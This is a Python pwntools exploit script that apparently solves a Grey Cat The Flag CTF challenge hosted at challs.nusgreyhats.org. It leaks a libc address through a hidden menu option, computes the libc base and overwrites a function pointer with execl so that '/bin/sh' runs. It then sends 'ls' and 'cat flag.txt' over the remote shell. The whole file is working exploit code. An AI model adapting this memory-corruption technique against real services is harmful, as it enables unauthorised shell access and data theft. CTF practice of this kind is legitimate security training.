from pwn import *
context.log_level = 'error'

def run():
    p = remote('challs.nusgreyhats.org', 31367)

    p.recvuntil(b'3. Make greycat talk\n')
    p.sendline(b'6767')
    libc_leak = int(p.recvline().strip(), 16)
    malloc_offset = 0xa50a0 # ubuntu 22.04
    libc_base = libc_leak - malloc_offset
    libc = ELF('libc_2.35.so', checksec=False)
    libc.address = libc_base

    execl = libc.sym['execl']

    # name is %rdi
    payload = b'/bin/sh\x00'.ljust(36, b'A') + p64(execl).strip(b'\x00')

    p.sendline(b'2')
    p.recvuntil(b'name:\n')
    p.sendline(payload)
    p.recvuntil(b'talk\n')

    p.sendline(b'3')
    p.recvuntil(b'index: \n')
    p.sendline(b'0')

    try:
        p.sendline(b'ls')
        p.sendline(b'cat flag.txt')
        out = p.recvall(timeout=1.5)
        print("Output:", out)
        if b'grey{' in out:
            print("WE GOT IT")
    except:
        pass

run()
